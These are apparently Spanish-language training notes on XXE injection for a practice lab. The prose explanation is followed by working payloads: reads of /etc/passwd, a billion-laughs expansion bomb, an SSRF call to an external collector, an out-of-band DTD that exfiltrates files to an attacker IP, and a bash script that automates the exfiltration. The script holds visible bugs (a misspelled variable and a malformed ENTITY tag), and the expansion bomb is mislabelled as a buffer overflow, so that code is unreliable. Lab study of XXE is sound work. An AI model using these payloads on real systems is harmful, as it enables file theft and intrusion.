# # XML External Entity Injection (XXE)

Tags: #XXE #OWASP #Explotacion 

Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de GitHub correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

-   **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

## XML en la web

* Usaremos XML como código para hacer los scripts. 
* El campo en donde debemos de fijarnos es aquel que el **Input** es el que nos representa en la web como **Output**

En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modificando
```xml
<?xml version="1.0" encoding="UTF-8"?>           <!-- Declaracion de XML--> 
	<!DOCTYPE foo [<!ENTITY myName "omar">]>    <!-- DTD y colocamos lo que queremos que salga en el output de la web -->
	<root>
		<name>
			<email>
				&myName;
			</email>
		</name>
	</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>       <!-- Colocamos la ruta abosluta del archivo -->
	<root>
		<name>
			<email>
				&myFile;
			</email>
		</name>
	</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>    <!-- Representara el output en una sola linea en base64 -->
	<root>
		<name>
			<email>
				&myFile;
			</email>
		</name>
	</root>
```

```xml 
<!-- Un millon de risas, ataque de Buffer Overflow-->

<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ELEMENT example ANY >
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  ]>
<example>
  &lol9;
</example>
```

```xml 
<!-- XXE -- SSRF -->

<!DOCTYPE xxe [ 
  <!ENTITY juju SYSTEM "http://9lvskwimvjek0wq5s8up8ja0grmia8yx.oastify.com?nombre=omar"> 
]>
```

## XXE OOB (Out Of Band) Blind 'External DTD'

```xml
<!-- Esto se hace cuando no podemos declara entidades, en esta ocasion lo llamaremos desde le propio DTD -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://IP/malicious.dtd"> %xxe;]>      
	<!-- Hara una peticion GET a nuestro servidor buscando el archivo malicious.dtd -->
	<root>
		<name>
			<email>
				test@test.com
			</email>
		</name>
	</root>

	<!-- IP = Direccion IP del atacante -->
```

```bash 
# Creamos el archivo DTD externo, en donde haremos que el '/etc/passwd' de la maquina victima nos lo regrese en base64 en una peticion por GET.

❯ nvim malicious.dtd

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://IP/?file=%file;'>">
%eval;
%exfil;

	# Cuando tenemos dos 'ENTITY' seguidas, debemos de colocar el '%' en hexadecimal = &#x25; 
	# IP = Direccion IP del atacante 
```

```bash 
❯ python3 -m http.server 80     # Creamos un servidor http por el puerto 80 para compartir el archivo 'malicious.dtd'
```

### Automatizar el proceso 

```bash
❯ nvim xxe_oob.sh                        # Creamos el archivo para automatizar el resultado final 

#!/bin/bash

echo -ne "[+] Introdiuce el archivo a leer: " && read -r myFilename   # n = Introducir el input en la misma linea, e = Salto de linea al principio

maliciuos_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://IP/?file=%file;'>\">                  
%eval;                                                                                                    
%exfil; """          # IP = Maquina de atacante 

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://IP/malicious.dtd"> %xxe;]>      
<root><name>test</name><tel>12345</tel><email>test@test.com</email><password>omar123</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID 
wait $PID 2>/dev/null

rm response 2>/dev/null
```